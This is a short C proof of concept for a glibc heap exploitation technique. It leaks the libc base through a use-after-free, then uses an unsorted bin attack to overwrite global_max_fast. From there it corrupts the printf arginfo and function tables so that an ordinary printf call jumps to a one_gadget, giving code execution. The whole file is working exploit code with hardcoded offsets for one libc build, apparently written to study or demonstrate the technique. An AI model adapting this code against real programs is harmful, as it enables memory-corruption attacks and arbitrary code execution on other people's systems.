#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define offset2size(ofs) ((ofs) * 2 - 0x10)
#define MAIN_ARENA       0x3ebc40
#define MAIN_ARENA_DELTA 0x60
#define GLOBAL_MAX_FAST  0x3ed940
#define PRINTF_FUNCTABLE 0x3f0658
#define PRINTF_ARGINFO   0x3ec870
#define ONE_GADGET       0xe5863

int main (void)
{
  unsigned long libc_base;
  char *a[10];
  setbuf(stdout, NULL); // make printf quiet

  /* leak libc */
  a[0] = malloc(0x1000); /* UAF chunk */
  a[1] = malloc(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));
  a[2] = malloc(offset2size(PRINTF_ARGINFO - MAIN_ARENA));
  free(a[0]);
  libc_base = *(unsigned long*)a[0] - MAIN_ARENA - MAIN_ARENA_DELTA;
  printf("libc @ 0x%lx\n", libc_base);

  /* prepare fake printf arginfo table */
  *(unsigned long*)(a[2] + ('x' - 2) * 8) = libc_base + ONE_GADGET;
	printf("%p\n",*(((unsigned long *)(a[2]))+118));
  /* unsorted bin attack */
	printf("p0 fwd pointer = %p\n",*(unsigned long *)(a[0]));
        printf("p0 bk pointer = %p\n",*(unsigned long *)(a[0]+8));
  *(unsigned long*)(a[0] + 8) = libc_base + GLOBAL_MAX_FAST - 0x10;
	printf("p0 fwd pointer = %p\n",*(unsigned long *)(a[0]));
        printf("p0 bk pointer = %p\n",*(unsigned long *)(a[0]+8));
	printf("Global_max_bins=%#lx\n",*(unsigned long *)(libc_base+GLOBAL_MAX_FAST));
  a[0] = malloc(0x1000); /* overwrite global_max_fast */
	printf("Global_max_bins=%#lx\n",*(unsigned long *)(libc_base+GLOBAL_MAX_FAST));
  /* overwrite __printf_arginfo_table and __printf_function_table */
  free(a[1]);
  free(a[2]);

  /* ignite! */
  printf("0x%x\n", 0);
  
  return 0;
}
